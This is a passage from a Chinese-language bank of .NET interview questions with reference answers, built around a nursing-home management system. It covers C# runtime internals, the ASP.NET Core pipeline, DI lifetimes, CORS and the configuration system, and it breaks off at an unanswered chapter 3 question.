# 面试题汇总：DotNet 企业开发全栈（养老院管理系统）

> **技术栈**：ASP.NET Core 5.0 + ABP Framework 4.4.0 + MySQL 8.0+
> **总计：297 道面试题** | 初级 87 / 中级 118 / 高级 92
> **生成日期**：2026-07-10

## 各章题数对照表
| 章节 | 标题 | 题数 |
|------|------|------|
| 第01章 | C# 进阶与面试高频原理 | 14 |
| 第02章 | ASP.NET Core 核心原理 | 14 |
| 第03章 | 配置体系与 appsettings.json 编写 | 14 |
| 第04章 | ABP 框架深度解析 | 14 |
| 第05章 | ABP 内置模块与基础设施 | 13 |
| 第06章 | EF Core 进阶与数据库设计 | 14 |
| 第07章 | 实体设计与仓储模式进阶 | 13 |
| 第08章 | 应用服务 DTO 与 API 设计规范 | 12 |
| 第09章 | 设计模式与架构原则 | 14 |
| 第10章 | 认证与授权 | 14 |
| 第11章 | 多租户架构 | 12 |
| 第12章 | Redis 缓存与分布式锁 | 12 |
| 第13章 | RabbitMQ 与 CAP 分布式事件总线 | 14 |
| 第14章 | Hangfire 后台任务与定时作业 | 12 |
| 第15章 | 文件管理与 Excel 导入导出 | 10 |
| 第16章 | 日志体系与异常处理 | 10 |
| 第17章 | 网络协议与安全防护 | 13 |
| 第18章 | SignalR 实时通信与消息推送 | 12 |
| 第19章 | 微服务架构与 API 网关 | 14 |
| 第20章 | 第三方服务集成 | 18 |
| 第21章 | 单元测试与质量保障 | 12 |
| 第22章 | Git 工作流与 Linux 运维基础 | 12 |
| 第23章 | Docker 容器化 CI/CD 与生产运维 | 10 |
| **合计** | | **297** |

---

## 第 01 章：C# 进阶与面试高频原理

### 第1题（初级 / 概念题）
**题目**：请解释 .NET 中 GC 的分代回收机制，为什么分为 Gen0、Gen1、Gen2 三代？

**参考答案**：GC 分代回收基于「代龄假说」——大多数对象都是短命的。Gen0 存放新创建的对象，容量最小但回收频率最高，绝大多数对象在此代就被回收。Gen1 是缓冲区，存放从 Gen0 回收后存活的对象，防止刚创建的对象被误判为长期对象。Gen2 存放从 Gen1 回收后仍存活的长生命周期对象，回收代价最高因为需要遍历更多存活对象。分代的核心优势是：小对象频繁回收（Gen0 代价低），大对象少回收（减少全堆扫描），整体上提高了 GC 效率。如果不分代，每次 GC 都要扫描整个堆，性能会非常差。

---

### 第2题（中级 / 概念题）
**题目**：Finalize 和 Dispose 有什么区别？为什么建议实现 IDisposable 而不是只依赖 Finalize？

**参考答案**：Finalize 是终结器（`~ClassName()`），由 GC 在回收对象时自动调用，但时机不确定，对象至少需要两轮 GC 才能被回收（第一轮放入终结器队列，第二轮才真正回收）。Dispose 是 `IDisposable` 接口的方法，由开发者显式调用，时机确定。只依赖 Finalize 的问题：1）资源释放时机不确定，可能导致连接池耗尽或文件锁定；2）有终结器的对象存活两轮 GC，增加内存压力；3）终结器线程是单线程，大量终结器会成为瓶颈。正确的做法是实现标准 Dispose 模式：`Dispose(bool disposing)` + `GC.SuppressFinalize(this)`，确保资源及时释放，同时避免终结器开销。

---

### 第3题（中级 / 场景题）
**题目**：你发现一个 ASP.NET Core 接口响应时间偶尔会飙到 5 秒以上，监控显示 GC 暂停时间较长，可能是什么原因？如何排查？

**参考答案**：可能原因：1）大量临时大对象分配（LOH > 85KB），触发 Gen2 GC；2）代码中手动调用了 `GC.Collect()`；3）存在大量短生命周期对象持有长生命周期对象的引用，导致 Gen1/Gen2 对象无法回收。排查步骤：1）使用 `dotnet-counters` 监控 GC 指标（Gen0/1/2 次数、暂停时间）；2）使用 `dotnet-dump` 抓取内存快照，用 `gcroot` 分析对象引用链；3）检查代码中是否有 `GC.Collect()` 调用；4）使用 `ArrayPool` 或对象池减少大对象分配；5）检查是否有事件订阅未取消导致的内存泄漏。

---

### 第4题（初级 / 概念题）
**题目**：值类型和引用类型在内存分配上有什么区别？struct 和 class 应该怎么选择？

**参考答案**：值类型（struct、enum、基本类型）直接存储数据，通常分配在栈上，赋值时进行值复制（深拷贝），修改副本不影响原件。引用类型（class、string、array）存储的是堆上对象的引用地址，赋值时复制引用（浅拷贝），两个变量指向同一对象。选择标准：struct 适合小型不可变数据（< 16 字节），如坐标、金额、ID，且不需要继承；class 适合复杂实体、需要继承、需要引用语义的场景。注意：struct 作为类的字段时跟随对象分配在堆上；struct 不能有无参构造函数（C# 10 之前）；struct 装箱后变为引用类型。

---

### 第5题（高级 / 代码题）
**题目**：请解释 async/await 编译后的状态机结构，并说明为什么在库代码中要使用 `ConfigureAwait(false)`。

**参考答案**：编译器将 `async` 方法转换为一个状态机结构体（`IAsyncStateMachine`），包含：状态编号（State）、方法局部变量提升的字段、`AsyncTaskMethodBuilder`。每个 `await` 点将方法拆分为不同状态，执行到 `await` 时如果任务未完成，当前线程被释放。任务完成后通过 `SynchronizationContext` 或 `ThreadPool` 回调恢复执行。`ConfigureAwait(false)` 的作用是告诉编译器「不需要回到原始同步上下文」，在库代码中必须使用的原因是：1）库代码不需要访问 UI 控件或 HTTP 上下文；2）避免不必要的上下文捕获和切换开销；3）避免死锁风险（在 ASP.NET 旧版框架中尤其重要）。ASP.NET Core 没有 SynchronizationContext，所以这个影响较小，但作为库代码的最佳实践仍然推荐使用。

---

### 第6题（中级 / 场景题）
**题目**：多个线程同时读写一个 Dictionary，会出现什么问题？有哪些线程安全的替代方案？

**参考答案**：`Dictionary<TKey, TValue>` 不是线程安全的，多线程并发读写可能导致：1）数据损坏（内部数组扩容时并发读取可能读到脏数据）；2）无限循环（哈希冲突链表被并发修改）；3）`KeyNotFoundException`（并发写入导致索引不一致）。替代方案：1）`ConcurrentDictionary`——最常用的线程安全字典，支持并发读写；2）`lock` + 普通 Dictionary——简单但性能较低（完全串行化）；3）`ReaderWriterLockSlim` + 普通 Dictionary——读多写少场景，允许多线程并发读取；4）不可变字典 `ImmutableDictionary`——每次修改返回新实例，适合低写入场景。选择取决于读写比例和性能要求。

---

### 第7题（中级 / 概念题）
**题目**：lock 的本质是什么？`lock(this)` 有什么问题？

**参考答案**：`lock` 是 C# 语法糖，编译后展开为 `Monitor.Enter` + `try/finally` + `Monitor.Exit`。Monitor 是基于对象头的同步原语，通过操作对象的同步块索引实现线程互斥。`lock(this)` 的问题：1）任何外部代码都可以 `lock` 同一个对象实例，导致意外的锁竞争甚至死锁；2）如果类是 public 的，多个不相关的模块可能共用同一把锁；3）`this` 可能被公开引用，增加了死锁风险。正确做法是声明一个 `private readonly object _lock = new object();` 作为专用锁对象，确保锁的作用域最小化。另外要注意 `lock(typeof(MyClass))` 更危险，因为 `typeof` 返回的 Type 对象在整个 AppDomain 中只有一个实例。

---

### 第8题（高级 / 设计题）
**题目**：在高并发场景下，如何设计一个线程安全的库存扣减系统？（类似养老院床位分配）

**参考答案**：设计要点：1）使用 `Interlocked.CompareExchange` 实现无锁 CAS 操作，适用于简单计数器场景；2）对于复合操作（如检查库存+扣减+记录日志），使用 `lock` 保护临界区；3）使用 `SemaphoreSlim` 限制并发数，防止数据库连接池耗尽；4）使用 `ConcurrentQueue` 管理可用资源（如床位编号队列）；5）使用乐观并发控制（版本号/时间戳），在数据库层面防止超卖。具体实现：先用 `Interlocked` 做快速预检，再用 `lock` 做精确扣减，结合数据库事务保证一致性。避免直接用 `lock(this)` 或锁对象对外暴露。对于极高并发，考虑 Redis 分布式锁或数据库行级锁。

---

### 第9题（初级 / 概念题）
**题目**：什么是装箱和拆箱？为什么要避免不必要的装箱拆箱？

**参考答案**：装箱是将值类型转换为引用类型的过程：在堆上分配内存，将栈上的值复制过去，返回引用地址。拆箱是反向操作：从堆上的对象中提取值类型数据，进行类型检查后复制到栈上。需要避免的原因：1）性能开销——装箱涉及内存分配和数据复制，拆箱涉及类型检查；2）GC 压力——装箱产生的临时对象增加 GC 负担；3）类型安全——拆箱时类型不匹配会抛出 InvalidCastException。避免方式：使用泛型集合（`List<int>` 代替 `ArrayList`）、泛型方法、`Nullable<T>` 处理可空值类型。在高性能场景下，装箱拆箱的累积影响可能非常显著。

---

### 第10题（高级 / 代码题）
**题目**：请实现一个标准的 Dispose 模式，并解释每个部分的作用。

**参考答案**：标准 Dispose 模式包含以下部分：1）`IDisposable.Dispose()` 方法——公开入口，调用 `Dispose(true)` 并调用 `GC.SuppressFinalize(this)` 阻止终结器执行；2）`Dispose(bool disposing)` 核心方法——当 `disposing=true` 时表示从 Dispose 调用，可释放托管和非托管资源，当 `disposing=false` 时表示从终结器调用，只能释放非托管资源（因为托管对象可能已被 GC 回收）；3）终结器 `~ClassName()`——安全网，调用 `Dispose(false)`，防止忘记调用 Dispose；4）`_disposed` 标志——防止重复释放；5）`protected virtual`——允许子类重写释放逻辑。关键点：`GC.SuppressFinalize` 让对象跳过终结器队列，避免两轮 GC 才能回收的开销。

---

### 第11题（中级 / 概念题）
**题目**：协变（out）和逆变（in）是什么？请举例说明它们的使用场景。

**参考答案**：协变（out）允许将泛型类型的子类型赋值给父类型变量，用于只读场景（返回值）。例如 `IEnumerable<string>` 可以赋值给 `IEnumerable<object>`，因为 string 是 object 的子类型，且 IEnumerable 只产出（out）T 类型的数据。逆变（in）允许将泛型类型的父类型赋值给子类型变量，用于只写场景（参数）。例如 `Action<object>` 可以赋值给 `Action<string>`，因为 Action 只消费（in）T 类型的数据，能处理 object 的方法自然能处理 string。使用场景：协变用于接口的只读操作（`IEnumerable<out T>`、`IReadOnlyList<out T>`），逆变用于接口的只写操作（`IComparer<in T>`、`Action<in T>`）。关键字：`out` 只能用在返回值位置，`in` 只能用在参数位置。

---

### 第12题（高级 / 场景题）
**题目**：ASP.NET Core 应用中大量使用反射进行依赖注入和服务注册，这会影响性能吗？如何优化？

**参考答案**：反射确实有性能开销（比直接调用慢 10-100 倍），但在 ASP.NET Core 的 DI 容器中影响有限，原因：1）反射主要发生在启动时的服务注册阶段，不在请求热路径上；2）框架内部已做了大量缓存（缓存 Type、PropertyInfo、构造函数信息）；3）ASP.NET Core 的 DI 容器使用编译表达式树（Expression Tree）优化了对象创建。优化策略：1）避免在循环或高频调用中使用反射获取类型信息；2）使用 `ActivatorUtilities.CreateInstance` 代替 `Activator.CreateInstance`；3）对于热路径，使用 `Delegate.CreateDelegate` 或 Expression Tree 将反射调用编译为强类型委托；4）考虑使用源代码生成器（Source Generator，C# 9+）在编译时生成 DI 代码，完全消除运行时反射开销。ABP 框架使用 Castle DynamicProxy 和缓存策略来最小化反射影响。

---

### 第13题（中级 / 概念题）
**题目**：Task、Thread、ThreadPool 有什么区别？在什么场景下选择哪个？

**参考答案**：Thread 是操作系统级线程，每个 Thread 约占 1MB 栈空间，创建销毁开销大，适合需要长期运行或需要精确控制线程属性（优先级、ApartmentState）的场景。ThreadPool 是线程池，复用已创建的线程，避免频繁创建销毁的开销，适合短时 CPU 密集型操作，但不保证执行顺序。Task 是最高级的抽象，底层默认使用 ThreadPool，支持返回值（`Task<T>`）、组合（`WhenAll/WhenAny`）、取消（`CancellationToken`）、异常传播。选择原则：优先使用 Task；I/O 密集型操作使用 async/await；CPU 密集型操作使用 `Task.Run`；只有需要精确控制线程行为时才直接使用 Thread。在 ASP.NET Core 中几乎不需要直接操作 Thread。

---

### 第14题（初级 / 概念题）
**题目**：string 为什么是不可变的？这有什么好处？

**参考答案**：string 的不可变性是指一旦创建，其内容不能被修改。任何「修改」操作（拼接、替换）都会创建新的字符串对象。设计为不可变的原因和好处：1）线程安全——不可变对象天然线程安全，无需加锁即可在多线程间共享；2）哈希值稳定——string 可以安全地作为 Dictionary 的 key，因为哈希值不会改变；3）字符串驻留池——相同内容的字符串字面量可以共享同一个对象，节省内存；4）安全性——在文件路径、数据库连接串等场景中，不可变性防止意外修改。坏处是频繁拼接时性能差（每次创建新对象），此时应使用 `StringBuilder`。

---


## 第 02 章：ASP.NET Core 核心原理

### 第1题（初级 / 概念题）
**题目**：请解释 ASP.NET Core 中 Singleton、Scoped、Transient 三种生命周期的区别。

**参考答案**：这三种生命周期决定了服务实例的创建和销毁时机。Singleton（单例）在应用启动时创建一次，所有请求共享同一个实例，直到应用关闭才销毁，适合全局缓存、配置管理等场景。Scoped（作用域）每个 HTTP 请求创建一个新实例，同一请求内共享同一个实例，请求结束时销毁，这是 DbContext 的默认生命周期，保证了同一请求内的数据库操作共享同一个 ChangeTracker。Transient（瞬时）每次注入都创建一个新实例，即使在同一请求内，不同位置注入的也是不同实例，适合无状态、轻量级的服务如短信发送、邮件服务。选择原则：无状态轻量服务用 Transient，依赖 DbContext 的用 Scoped，全局唯一的用 Singleton。

---

### 第2题（中级 / 场景题）
**题目**：什么是 Captive Dependency？在养老院系统中，如果把一个依赖 DbContext 的服务注册为 Singleton，会导致什么问题？

**参考答案**：Captive Dependency（被俘获的依赖）是指长生命周期的服务依赖了短生命周期的服务。例如，`ElderReportService` 注册为 Singleton，但它依赖的 `NursingHomeDbContext` 是 Scoped。当 Singleton 服务在应用启动时被创建，它持有的 DbContext 实例会一直存活到应用关闭。这会导致三个严重问题：第一，所有请求共享同一个 DbContext 的 ChangeTracker，并发请求会导致数据污染（比如两个请求同时修改长者信息，ChangeTracker 状态混乱）。第二，DbContext 内部持有的数据库连接不会被释放，导致连接池耗尽。第三，查询到的数据可能是很久之前的缓存，不是最新数据。解决方案是注入 `IServiceScopeFactory`，在每次使用时创建新的 Scope，从中获取 DbContext 实例。

---

### 第3题（高级 / 设计题）
**题目**：请画出 ASP.NET Core Filter 的五种类型及其执行顺序，并解释为什么 ActionFilter 的 OnActionExecuted 在 ExceptionFilter 之前执行。

**参考答案**：Filter 执行顺序为 AuthorizationFilter → ResourceFilter（OnResourceExecuting）→ ActionFilter（OnActionExecuting）→ Action 方法执行 → ActionFilter（OnActionExecuted）→ ExceptionFilter → ResultFilter（OnResultExecuting/OnResultExecuted）→ ResourceFilter（OnResourceExecuted）。ActionFilter 的 OnActionExecuted 在 ExceptionFilter 之前执行，是因为 OnActionExecuted 是在 Action 方法返回后、但在异常被传播到 ExceptionFilter 之前同步调用的。在 OnActionExecuted 中，可以通过 `context.Exception` 检查 Action 是否抛出了异常，甚至可以设置 `context.Exception = null` 来"吞掉"异常。如果异常没有在 ActionFilter 中处理，才会传递到 ExceptionFilter。这种设计给了 ActionFilter 机会在更靠近异常发生的地方处理异常，比如记录操作日志时同时记录异常信息。

---

### 第4题（中级 / 概念题）
**题目**：中间件（Middleware）和 Filter 有什么区别？各自适合什么场景？

**参考答案**：中间件和 Filter 是 ASP.NET Core 中两个不同层面的请求处理机制。中间件工作在整个应用的请求管道中，在路由匹配之前执行，不知道请求会路由到哪个 Controller/Action，适合处理全局性的逻辑如日志、CORS、认证、静态文件等。Filter工作在 MVC/WebAPI 管道内部，在路由匹配之后执行，可以获取到具体的 Controller、Action、参数等信息，适合处理与具体业务相关的逻辑如参数验证、操作日志、异常处理、结果格式化等。一个形象的比喻：中间件是门卫和前台（不知道访客找谁），Filter 是楼层管理员（知道具体找哪个房间）。在实际项目中，两者经常配合使用，比如中间件处理认证和 CORS，Filter 处理操作日志和异常处理。

---

### 第5题（初级 / 代码题）
**题目**：请写出一个自定义中间件的完整代码，实现记录每个请求的耗时。

**参考答案**：自定义中间件需要遵循三个约定：构造函数接收 `RequestDelegate next`、实现 `InvokeAsync(HttpContext context)` 方法、调用 `await next(context)` 传递管道。具体实现：在 InvokeAsync 中，先用 `Stopwatch.StartNew()` 记录开始时间，然后调用 `await _next(context)` 执行后续中间件，最后 `stopwatch.Stop()` 停止计时，检查 `context.Response.HasStarted` 后再将耗时写入响应头 `context.Response.Headers["X-Elapsed-Time"] = $"{elapsed}ms"`。还需要提供一个扩展方法 `UseElapsedTime(this IApplicationBuilder builder)` 用于在 Startup 中注册。这种中间件放在管道的靠前位置，可以统计整个请求的总耗时，包括所有后续中间件和 Filter 的处理时间。

---

### 第6题（高级 / 场景题）
**题目**：在养老院系统中，前端调用 PUT `/api/elder/1` 接口时出现 CORS 错误，但 GET 请求正常。请分析可能的原因。

**参考答案**：GET 请求是简单请求，浏览器直接发送；而 PUT 请求是非简单请求，浏览器会先发送 OPTIONS 预检请求。可能的原因有：第一，CORS 中间件配置顺序错误，放在了 `UseRouting()` 之前，导致中间件无法获取路由信息来处理预检请求。第二，CORS 策略没有配置 `AllowAnyMethod()` 或 `WithMethods("PUT")`，导致 PUT 方法不被允许。第三，后端有全局异常处理中间件拦截了 OPTIONS 请求，返回了 405 状态码。第四，前端请求携带了自定义 Header（如 `X-Custom-Header`），但 CORS 策略没有配置 `AllowAnyHeader()` 或 `WithHeaders("X-Custom-Header")`。排查步骤：检查浏览器 Network 面板是否有 OPTIONS 请求及其响应状态码，检查后端 Startup.cs 中 CORS 中间件的注册顺序，检查 CORS 策略的 Method 和 Header 配置。

---

### 第7题（中级 / 概念题）
**题目**：`app.Use()`、`app.Map()`、`app.Run()` 三者有什么区别？

**参考答案**：这三种方法用于在 Startup.Configure 中配置中间件管道。Use是中间件的通用注册方式，它接收一个 `context` 和 `next` 委托，可以执行前置逻辑后调用 `await next()` 将请求传递给下一个中间件，也可以不调用 next 来终止管道，适合日志记录、认证检查等需要前后置处理的场景。Map根据请求路径进行分支，将匹配特定路径前缀的请求分流到子管道中处理，类似路由的分流功能，比如 `/api/admin` 走管理员通道，`/api/elder` 走长者服务通道。Run是管道的终结点，它只接收 `context` 参数，不接收 `next`，意味着它不会调用后续中间件，请求到此为止。一个管道中可以有多个 Use，但 Run 通常只有一个且放在最后。

---

### 第8题（高级 / 设计题）
**题目**：如何在 Singleton 服务中安全地使用 Scoped 服务？请给出代码示例。

**参考答案**：不能直接通过构造函数注入 Scoped 服务到 Singleton 中（会造成 Captive Dependency），正确做法是注入 `IServiceScopeFactory` 工厂，在需要使用时动态创建 Scope。代码示例：`ElderBackgroundService` 是 Singleton 服务（比如后台定时任务），它需要查询数据库。构造函数注入 `IServiceScopeFactory _scopeFactory`，在 `DoWork()` 方法中使用 `using (var scope = _scopeFactory.CreateScope())` 创建新 Scope，然后通过 `scope.ServiceProvider.GetRequiredService<NursingHomeDbContext>()` 获取 DbContext 实例。这样每次调用都会创建一个新的 Scope 和新的 DbContext，保证了数据隔离和资源释放。注意：创建的 Scope 在 using 块结束时自动释放，DbContext 也随之释放。

---

### 第9题（初级 / 概念题）
**题目**：什么是 CORS？为什么前后端分离项目必须配置 CORS？

**参考答案**：CORS（Cross-Origin Resource Sharing，跨域资源共享）是一种浏览器安全机制。浏览器的同源策略要求，只有当请求的协议、域名、端口三者完全相同时，才允许 JavaScript 访问响应数据。前后端分离项目中，前端通常运行在 `localhost:3000`（Vue/React 开发服务器），后端运行在 `localhost:5000`（ASP.NET Core），虽然都在本地，但端口不同，浏览器认为这是跨域请求并阻止。配置 CORS 就是在后端响应中添加特定的 HTTP 头（如 `Access-Control-Allow-Origin`），告诉浏览器「我允许这个来源的请求」。需要注意的是，CORS 是浏览器的安全限制，Postman 等工具不受此限制。

---

### 第10题（中级 / 代码题）
**题目**：请实现一个 ActionFilter，记录养老院系统中每次接口调用的操作日志（包括调用者、时间、接口名、耗时）。

**参考答案**：创建一个实现 `IActionFilter` 接口的类 `OperationLogFilter`。在构造函数中注入 `NursingHomeDbContext`。`OnActionExecuting` 方法中启动 Stopwatch 计时，将开始时间和用户名存入 `context.HttpContext.Items`。`OnActionExecuted` 方法中停止计时，从 Items 中取出开始时间和用户名，获取 Controller 名称和 Action 名称，构建 `OperationLog` 实体并保存到数据库。注册方式：通过 `services.AddScoped<OperationLogFilter>()` 先注册到 DI 容器，然后在 `options.Filters.AddService<OperationLogFilter>()` 中全局注册（使用 `AddService` 而非 `Add`，以便通过 DI 解析构造函数依赖），或在 Controller/Action 上使用 `[ServiceFilter(typeof(OperationLogFilter))]` 局部注册。

---

### 第11题（高级 / 场景题）
**题目**：在生产环境中，Nginx + Kestrel 的部署架构有什么优势？为什么不直接用 Kestrel 对外服务？

**参考答案**：Kestrel 虽然是高性能的 Web 服务器，但不适合直接暴露到公网。Nginx + Kestrel 架构的优势在于：第一，SSL 终止：Nginx 负责处理 HTTPS 加密解密，Kestrel 只处理 HTTP，减轻应用服务器负担。第二，负载均衡：Nginx 可以将请求分发到多个 Kestrel 实例，实现水平扩展。第三，静态文件：Nginx 处理静态文件（CSS/JS/图片）的性能远优于 Kestrel。第四，安全防护：Nginx 可以做请求过滤、IP 黑名单、速率限制、防 DDoS 等。第五，请求缓冲：当 Kestrel 处理较慢时，Nginx 会缓冲客户端请求，避免慢客户端占用 Kestrel 连接。第六，健康检查：Nginx 可以定期检查 Kestrel 实例的健康状态，自动剔除异常实例。

---

### 第12题（中级 / 概念题）
**题目**：ABP 框架中的工作单元（Unit of Work）Filter 是如何工作的？它解决了什么问题？

**参考答案**：ABP 的工作单元 Filter 是一个 ActionFilter（底层通过动态代理拦截器实现），在请求进入时自动开启数据库事务，在 Action 成功执行后自动提交事务，在异常发生时自动回滚。它解决了三个问题：第一，事务一致性：在没有 UoW 时，开发者需要手动写 `using (var transaction = await _context.Database.BeginTransactionAsync())` 来管理事务，容易遗漏。UoW Filter 自动管理，保证同一请求内的所有数据库操作要么全部成功，要么全部回滚。第二，代码简洁：开发者只需要关注业务逻辑，不需要关心事务管理。第三，嵌套支持：ABP 的 UoW 支持嵌套，内层 UoW 共享外层的事务，只有最外层 UoW 提交时才真正提交到数据库。在养老院系统中，分配房间需要同时更新长者信息和房间状态，UoW 保证这两个操作的原子性。

---

### 第13题（高级 / 设计题）
**题目**：请设计一个养老院系统的全局异常处理方案，要求整合中间件和 Filter 两种方式。

**参考答案**：全局异常处理需要分两层：中间件层（最外层）和Filter 层（内层）。中间件层使用 `app.UseExceptionHandler()` 捕获中间件管道中的异常（如认证中间件、CORS 中间件抛出的异常），返回通用错误页面或 JSON。Filter 层使用 `IExceptionFilter` 捕获 Controller/Action 中的异常，可以返回更详细的业务错误信息。两者分工：中间件处理「管道级」异常（如数据库连接失败、认证服务不可用），Filter 处理「业务级」异常（如参数验证失败、业务规则冲突）。在 Filter 中，可以通过 `context.Exception` 获取异常信息，设置 `context.ExceptionHandled = true` 标记异常已处理，然后返回统一格式的错误响应 `{ Code: 500, Message: "xxx", Detail: "xxx" }`。对于不同类型的异常（如 `BusinessException`、`NotFoundException`），可以映射为不同的 HTTP 状态码。

---

### 第14题（初级 / 概念题）
**题目**：`[EnableCors]` 和 `[DisableCors]` 特性分别在什么场景下使用？

**参考答案**：当在全局配置了 CORS 策略后，所有 Controller 都会应用该策略。如果某个特定的 Controller 或 Action 需要使用不同的 CORS 策略，可以在该 Controller/Action 上使用 `[EnableCors("AnotherPolicy")]` 指定另一个策略名称。如果某个 Controller 或 Action 不需要 CORS（比如内部健康检查接口、Webhook 回调接口），可以使用 `[DisableCors]` 禁用 CORS。典型场景：养老院系统的健康检查接口 `/health` 只供运维工具调用，不需要跨域访问，可以加上 `[DisableCors]`；而管理后台 API 需要更宽松的 CORS 策略，可以单独指定 `[EnableCors("AdminPolicy")]`。

---


## 第 03 章：配置体系与 appsettings.json 编写

### 第1题（初级 / 概念题）
**题目**：ASP.NET Core 中配置文件的加载顺序是什么？后加载的配置会覆盖先加载的吗？

**参考答案**：加载顺序为：`appsettings.json` → `appsettings.{Env}.json` → User Secrets → 环境变量 → 命令行参数。后加载的配置源会覆盖先加载的同名 Key，这就是「后来者居上」的优先级规则。这个设计让基础配置放在 `appsettings.json` 中，敏感配置通过环境变量注入，实现配置分离。

---

### 第2题（初级 / 概念题）
**题目**：`appsettings.json` 中的 `ConnectionStrings` 节点有什么特殊含义？

**参考答案**：`ConnectionStrings` 是 ASP.NET Core 的约定名称，框架内置了对它的支持。可以通过 `configuration.GetConnectionString("Default")` 直接获取连接字符串，而不需要写 `configuration["ConnectionStrings:Default"]`。这个约定让连接字符串的获取更加简洁。在 ABP 框架中，`ConnectionStrings:Default` 是默认数据库连接的约定名称。

---

### 第3题（中级 / 概念题）
**题目**：`IOptions<T>`、`IOptionsSnapshot<T>` 和 `IOptionsMonitor<T>` 有什么区别？分别在什么场景下使用？

**参考答案**：| 接口 | 生命周期 | 热重载 | 典型场景 |
|---|---|---|---|
| `IOptions<T>` | Singleton | 不支持 | 数据库连接字符串、公司名称等静态配置 |
| `IOptionsSnapshot<T>` | Scoped | 支持 | 每个请求可能需要最新值的业务配置 |
| `IOptionsMonitor<T>` | Singleton | 支持 + OnChange | 需要在配置变化时执行额外逻辑（如刷新缓存） |

`IOptions<T>` 在应用启动时绑定一次，之后值不变。`IOptionsSnapshot<T>` 每个 HTTP 请求重新读取，但不能注入到 Singleton 服务中。`IOptionsMonitor<T>` 是 Singleton 生命周期但支持动态更新，还提供 `OnChange` 回调。

---

### 第4题（中级 / 概念题）
**题目**：为什么 `IOptionsSnapshot<T>` 不能注入到 Singleton 服务中？

**参考答案**：`IOptionsSnapshot<T>` 的生命周期是 Scoped（每个 HTTP 请求创建一个新实例）。Singleton 服务在整个应用生命周期内只创建一次，如果把 Scoped 的 `IOptionsSnapshot<T>` 注入到 Singleton 中，会出现「被俘获的依赖（Captive Dependency）」问题——Singleton 服务持有的 `IOptionsSnapshot<T>` 实例在第一个请求结束后就被销毁了，后续请求拿到的值可能过期或抛出异常。ASP.NET Core 的依赖注入容器在默认严格模式下会检测到这个问题并抛出异常。

---

### 第5题（初级 / 概念题）
**题目**：如何在 Docker 部署时用环境变量覆盖 `appsettings.json` 中的配置？

**参考答案**：环境变量名用双下划线 `__` 表示 JSON 的层级关系。例如，`appsettings.json` 中 `Redis:Host` 对应环境变量 `Redis__Host`。在 `docker-compose.yml` 的 `environment` 段中配置即可。ASP.NET Core 的默认配置加载器会自动将环境变量映射到对应的配置 Key 上。

---

### 第6题（中级 / 概念题）
**题目**：`Configure<T>` 和 `PostConfigure<T>` 有什么区别？

**参考答案**：`Configure<T>` 用于正常绑定配置，可以多次调用（多次调用时后面的覆盖前面的）。`PostConfigure<T>` 在所有 `Configure<T>` 执行完毕后才执行，适合做补充默认值、数据校验、格式规范化等后处理工作。例如，确保 URL 以 `/` 结尾、为未配置的字段设置默认值等。执行顺序是：所有 `Configure<T>` → 所有 `PostConfigure<T>`。

---

### 第7题（初级 / 代码题）
**题目**：如何实现 `appsettings.json` 修改后不重启应用就能生效？

**参考答案**：两步：(1) 在添加配置文件时设置 `reloadOnChange: true`——`config.AddJsonFile("appsettings.json", reloadOnChange: true)`；(2) 在业务代码中使用 `IOptionsSnapshot<T>` 或 `IOptionsMonitor<T>` 而不是 `IOptions<T>`。注意：只有文件类型的配置源支持热重载，环境变量和命令行参数不支持。

---

### 第8题（中级 / 场景题）
**题目**：如果同时在 `appsettings.json` 和环境变量中配置了 `Redis:Host`，最终生效的是哪个？为什么？

**参考答案**：最终生效的是环境变量中的值。因为 `CreateDefaultBuilder` 的加载顺序是：先加载 `appsettings.json`，再加载 `appsettings.{Env}.json`，最后加载环境变量。同名 Key 以最后加载的为准，所以环境变量优先级更高。这个设计让运维人员可以在不修改配置文件的情况下覆盖任何配置。

---

### 第9题（高级 / 设计题）
**题目**：如何设计一个 Options 类来组织应用的配置？请以养老院系统为例说明。

**参考答案**：定义一个 POCO 类，属性名与 JSON Key 对应（使用 camelCase）。在类中定义一个 `const string SectionName = "Yls"` 常量表示配置段名称。在 `Startup.ConfigureServices` 中通过 `services.Configure<YlsOptions>(configuration.GetSection(YlsOptions.SectionName))` 注册。在业务服务中通过构造函数注入 `IOptions<YlsOptions>` 使用。好处是：强类型、有智能提示、不会因为字符串拼错导致运行时错误。

---

### 第10题（高级 / 概念题）
**题目**：ASP.NET Core 的配置系统底层是如何工作的？`IConfigurationRoot` 和 `IConfigurationSection` 的关系是什么？

**参考答案**：ASP.NET Core 的配置系统基于 `IConfigurationRoot` 和 `IConfigurationProvider`。`IConfigurationRoot` 是配置的根节点，内部持有多个 `IConfigurationProvider`（每种配置源一个）。当读取某个 Key 时，`IConfigurationRoot` 会按 Provider 的注册顺序依次查找，返回第一个非空值。`IConfigurationSection` 表示配置的某个子节点，通过 `GetSection("Yls")` 获取。本质上是一个树形结构，用 `:` 分隔层级，如 `Yls:Company` 表示根节点下的 Yls 子节点下的 Company。

---

### 第11题（中级 / 代码题）
**题目**：在 ABP 框架中，如何自定义配置来替换 ABP 默认的配置加载行为？

**参考答案**：在 `CreateHostBuilder` 中通过 `ConfigureAppConfiguration` 添加自定义配置源。ABP 框架内部使用 `IOptions<AbpDbConnectionOptions>` 管理数据库连接，使用 `IOptions<RedisCacheOptions>` 管理 Redis 缓存。可以通过 `services.Configure<AbpDbConnectionOptions>(...)` 覆盖默认行为。在模块类的 `PreConfigureServices` 或 `ConfigureServices` 方法中操作。

---

### 第12题（高级 / 场景题）
**题目**：你的养老院系统部署了 3 个实例（容器），需要修改某个配置项让所有实例同时生效。你会怎么做？

**参考答案**：有几种方案：(1) 如果使用了 `reloadOnChange` 且通过挂载共享配置卷的方式，修改配置文件后所有实例自动感知。(2) 通过 Kubernetes ConfigMap 更新配置，Pod 重启后生效。(3) 使用配置中心（如 Nacos、Consul、Azure App Configuration），所有实例通过 `IOptionsMonitor<T>` 监听配置变化，实时生效。(4) 如果是简单的环境变量变更，需要重新部署容器。推荐方案是配置中心 + `IOptionsMonitor<T>` 的组合。

---

### 第13题（中级 / 概念题）
**题目**：什么是 User Secrets？它和 `appsettings.Development.json` 有什么区别？

**参考答案**：User Secrets 是 .NET 提供的开发者敏感信息存储机制，存储在用户目录下（Linux: `~/.microsoft/usersecrets/`，Windows: `%APPDATA%\Microsoft\UserSecrets\`），不在项目目录中，因此不会被误提交到 Git。`appsettings.Development.json` 虽然也可以 `.gitignore` 排除，但它物理上存在于项目目录中，存在泄露风险。User Secrets 仅在 Development 环境下加载，适合存放数据库密码、API Key 等。

---

### 第14题（高级 / 概念题）
**题目**：`IOptionsMonitor<T>` 是如何感知配置变化的？

